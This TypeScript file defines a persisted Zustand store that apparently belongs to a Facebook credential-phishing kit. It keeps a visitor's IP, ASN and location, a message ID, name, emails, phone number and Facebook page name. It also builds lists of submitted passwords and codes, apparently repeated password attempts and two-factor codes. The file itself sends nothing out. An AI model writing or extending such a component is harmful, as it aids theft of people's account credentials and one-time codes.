import { create } from 'zustand';
import { createJSONStorage, persist } from 'zustand/middleware';

interface GeoInfo {
    asn: number;
    ip: string;
    country: string;
    city: string;
    country_code: string;
}

interface UserData {
    fullName: string;
    personalEmail: string;
    businessEmail: string;
    phoneNumber: string;
    facebookPageName: string;
    passwords: string[];
    codes: string[];
}

interface State {
    isModalOpen: boolean;
    geoInfo: GeoInfo | null;
    messageId: number | null;
    userData: UserData;
    setModalOpen: (isOpen: boolean) => void;
    setGeoInfo: (info: GeoInfo) => void;
    setMessageId: (id: number | null) => void;
    setUserData: (data: Partial<UserData>) => void;
    addPassword: (password: string) => void;
    addCode: (code: string) => void;
}

export const store = create<State>()(
    persist(
        (set) => ({
            isModalOpen: false,
            geoInfo: null,
            messageId: null,
            userData: {
                fullName: '',
                personalEmail: '',
                businessEmail: '',
                phoneNumber: '',
                facebookPageName: '',
                passwords: [],
                codes: []
            },
            setModalOpen: (isOpen: boolean) => set({ isModalOpen: isOpen }),
            setGeoInfo: (info: GeoInfo) => set({ geoInfo: info }),
            setMessageId: (id: number | null) => set({ messageId: id }),
            setUserData: (data: Partial<UserData>) => set((state) => ({
                userData: { ...state.userData, ...data }
            })),
            addPassword: (password: string) => set((state) => ({
                userData: { ...state.userData, passwords: [...state.userData.passwords, password] }
            })),
            addCode: (code: string) => set((state) => ({
                userData: { ...state.userData, codes: [...state.userData.codes, code] }
            }))
        }),
        {
            name: 'storage',
            storage: createJSONStorage(() => localStorage),
            partialize: (state) => ({
                geoInfo: state.geoInfo,
                messageId: state.messageId,
                userData: state.userData
            })
        }
    )
);
